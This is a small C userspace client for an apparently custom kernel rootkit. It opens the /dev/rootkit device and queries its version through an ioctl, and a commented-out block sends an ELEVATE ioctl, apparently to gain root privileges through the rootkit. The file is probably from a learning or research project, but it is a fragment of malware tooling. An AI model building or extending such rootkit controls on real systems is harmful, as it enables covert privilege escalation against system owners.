#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "../kernel/interface.h"

int main(void) {

	int fd;
    int version = 0;

    fd = open("/dev/rootkit", O_RDONLY);

    if (fd == -1) {
        perror("open");
        return 1;
    }

    printf("Device opened successfully\n");

    if (ioctl(fd, RK_GET_VERSION, &version) == -1) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    printf("Version: %d\n", version);

    close(fd);
    return 0;

	// int fd;

	// fd = open("/dev/rootkit", O_RDONLY);

	//  if (fd == -1) {
    //     perror("open");
    //     return 1;
    // }

    // if (ioctl(fd, ELEVATE, NULL) == -1) {
    //     perror("ioctl");
    //     close(fd);
    //     return 1;
    // }

    // close(fd);

	
	// return 0;
}